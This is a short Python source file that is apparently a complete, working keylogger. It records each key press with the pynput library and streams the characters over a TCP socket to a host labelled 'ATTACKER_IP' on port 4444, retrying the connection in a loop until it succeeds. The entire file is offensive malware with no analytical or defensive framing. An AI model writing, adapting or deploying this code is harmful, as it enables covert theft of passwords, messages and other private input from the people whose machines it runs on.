import socket
import time
from pynput import keyboard

# Configuration
ATTACKER_IP = '0.0.0.0'  # Replace with your host IP (attacker's machine)
ATTACKER_PORT = 4444           # Port the server is listening on
sock = None

def connect_to_server():

    global sock
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a new TCP socket
            sock.connect((ATTACKER_IP, ATTACKER_PORT))                # Attempt to connect
            break
        except Exception as e:
            time.sleep(1)

def send_log(log_data):

    global sock
    try:
        sock.sendall(log_data.encode())  # Send data as bytes
    except Exception as e:
        try:
            sock.close()  # Close broken socket
        except:
            pass
        connect_to_server()  # Try to reconnect

def on_press(key):

    try:

        if key.char:
            send_log(key.char)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            send_log('\n')  # Convert space to a newline


def start_keylogger():

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep the listener running

if __name__ == "__main__":
    connect_to_server()  # Establish connection with the server
    start_keylogger()    # Start logging keystrokes
